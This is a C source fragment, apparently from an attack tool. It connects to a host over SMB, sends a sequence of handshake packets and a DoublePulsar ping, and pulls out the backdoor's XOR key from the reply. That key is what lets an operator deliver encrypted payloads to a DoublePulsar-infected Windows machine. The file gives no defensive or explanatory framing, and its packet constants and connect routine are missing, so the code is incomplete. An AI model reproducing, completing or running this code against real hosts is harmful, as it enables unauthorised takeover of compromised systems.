#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int dp_send_all(int fd, const void *data, size_t length)
{
    const unsigned char *p = data;

    while (length != 0) {
        ssize_t n = send(fd, p, length, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static int dp_recv_all(int fd, void *data, size_t length)
{
    unsigned char *p = data;

    while (length != 0) {
        ssize_t n = recv(fd, p, length, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static int dp_exchange(int fd, const void *packet, size_t packet_length,
                       unsigned char **response, size_t *response_length)
{
    unsigned char header[4];
    size_t payload_length;
    unsigned char *buffer;

    if (dp_send_all(fd, packet, packet_length) < 0)
        return -1;
    if (dp_recv_all(fd, header, sizeof(header)) < 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    buffer = malloc(payload_length + sizeof(header));
    if (buffer == NULL)
        return -1;

    for (size_t i = 0; i < sizeof(header); ++i)
        buffer[i] = header[i];

    if (dp_recv_all(fd, buffer + sizeof(header), payload_length) < 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = payload_length + sizeof(header);
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int fd;
    unsigned char *response = NULL;
    size_t response_length = 0;
    unsigned int key = 0;
    int ok = 0;

    if (ip == NULL)
        return 0;

    fd = smb_connect(ip, port);
    if (fd < 0)
        return 0;

    if (dp_exchange(fd, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(fd, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(fd, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(fd, DP_PING_PKT, sizeof(DP_PING_PKT),
                    &response, &response_length) < 0)
        goto done;

    if ((size_t)SMB_RESP_SIGNATURE_START + 4 <= response_length &&
        (size_t)SMB_RESP_SIGNATURE_END >=
            (size_t)SMB_RESP_SIGNATURE_START + 4) {
        key = ((unsigned int)response[SMB_RESP_SIGNATURE_START] << 24) |
              ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 16) |
              ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 8) |
              (unsigned int)response[SMB_RESP_SIGNATURE_START + 3];
        ok = 1;
    }

done:
    free(response);
    close(fd);
    return ok ? key : 0;
}